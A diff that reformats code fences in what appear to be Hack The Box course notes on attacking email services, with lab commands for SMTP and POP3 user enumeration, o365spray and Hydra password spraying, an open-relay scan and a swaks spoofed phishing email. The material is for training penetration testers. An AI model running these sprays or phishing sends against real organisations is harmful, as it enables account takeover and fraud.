@@ -26,15 +26,13 @@ We can use tools such as `host` or `dig` and online websites such as [MXToolbox]
 
 #### Host - MX Records
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ host -t MX hackthebox.eu
 
 hackthebox.eu mail is handled by 1 aspmx.l.google.com.
 ```
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ host -t MX microsoft.com
 
 microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
@@ -42,8 +40,7 @@ microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
 
 #### DIG - MX Records
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ dig mx plaintext.do | grep "MX" | grep -v ";"
 
 plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
@@ -51,8 +48,7 @@ plaintext.do.           7076    IN      MX      10 mx.zoho.com.
 plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
 ```
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ dig mx inlanefreight.com | grep "MX" | grep -v ";"
 
 inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
@@ -60,8 +56,7 @@ inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
 
 #### Host - A Records
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ host -t A mail1.inlanefreight.htb.
 
 mail1.inlanefreight.htb has address 10.129.14.128
@@ -85,8 +80,7 @@ If we are targetting a custom mail server implementation such as `inlanefreight.
 
 We can use `Nmap`'s default script `-sC` option to enumerate those ports on the target system:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
@@ -113,8 +107,7 @@ The SMTP server has different commands that can be used to enumerate valid usern
 
 #### VRFY Command
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ telnet 10.10.110.20 25
 
 Trying 10.10.110.20...
@@ -139,8 +132,7 @@ VRFY new-user
 
 #### EXPN Command
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ telnet 10.10.110.20 25
 
 Trying 10.10.110.20...
@@ -162,8 +154,7 @@ EXPN support-team
 
 #### RCPT TO Command
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ telnet 10.10.110.20 25
 
 Trying 10.10.110.20...
@@ -192,8 +183,7 @@ We can also use the `POP3` protocol to enumerate users depending on the service 
 
 #### USER Command
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ telnet 10.10.110.20 110
 
 Trying 10.10.110.20...
@@ -212,8 +202,7 @@ USER john
 
 To automate our enumeration process, we can use a tool named [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum). We can specify the enumeration mode with the argument `-M` followed by `VRFY`, `EXPN`, or `RCPT`, and the argument `-U` with a file containing the list of users we want to enumerate. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument `-D`. Finally, we specify the target with the argument `-t`.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
 
 Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
@@ -251,8 +240,7 @@ As discussed, cloud service providers use their own implementation for email ser
 
 #### O365 Spray
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz
 
             *** O365 Spray ***            
@@ -273,8 +261,7 @@ hiimeins@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz
 
 Now, we can attempt to identify usernames.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
                                        
             *** O365 Spray ***             
@@ -313,8 +300,7 @@ We can use `Hydra` to perform a password spray or brute force against email serv
 
 #### Hydra - Password Attack
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
 
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -331,8 +317,7 @@ If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to atte
 
 #### O365 Spray - Password Spraying
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
 
             *** O365 Spray ***            
@@ -377,8 +362,7 @@ An open relay is a Simple Mail Transfer Protocol (`SMTP`) server, which is impro
 
 From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email. For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees. We can send a similar email using the same address and add our phishing link with this information. With the `nmap smtp-open-relay` script, we can identify if an SMTP port allows an open relay.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
@@ -392,8 +376,7 @@ PORT   STATE SERVICE
 
 Next, we can use any mail client to connect to the mail server and send our email.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
 
 === Trying 10.10.11.213:25...
